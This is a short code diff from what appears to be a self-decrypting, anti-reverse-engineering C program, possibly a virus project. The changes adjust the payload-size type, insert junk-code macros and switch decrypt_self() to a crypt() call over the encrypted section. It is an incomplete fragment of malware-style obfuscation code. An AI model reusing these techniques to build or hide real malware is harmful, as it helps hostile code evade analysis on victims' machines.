@@ -5,7 +5,6 @@
 #include "death.h"
 #include "syscall.h"
 
-
 void	decrypt_self(void);
 void	entrypoint(int argc, char **argv, char **envp);
 
@@ -46,7 +45,7 @@ bool	TEXT_VAR g_is_encrypted = false;
 
 int		TEXT_VAR g_start_offset = ORIG_TEXT_OFF;
 char	TEXT_VAR **g_envp = NULL;
-unsigned int TEXT_VAR g_payload_size = 0;
+size_t	TEXT_VAR g_payload_size;
 
 void junk_main(void) {
 	char hello[] = "dont reverse me :(";
@@ -74,7 +73,7 @@ void decrypt_self(void)
 {
 	if (g_is_encrypted == false) {
 		return;
-	}
+	} JUNK;
 
 	if (g_start_offset == ORIG_TEXT_OFF) {
 
@@ -95,10 +94,8 @@ void decrypt_self(void)
 				: "rax", "rdi", "rsi", "memory" /* clobber */
 			);
 
-	}
+	} JUNK;
 
-	//void *start_addr = (void* )(uintptr_t)&real_start;
-	//decrypt(start_addr, PAYLOAD_SIZE, g_key);
 	crypt((uint8_t *)(uintptr_t)&real_start, g_payload_size);
 	return;
 }
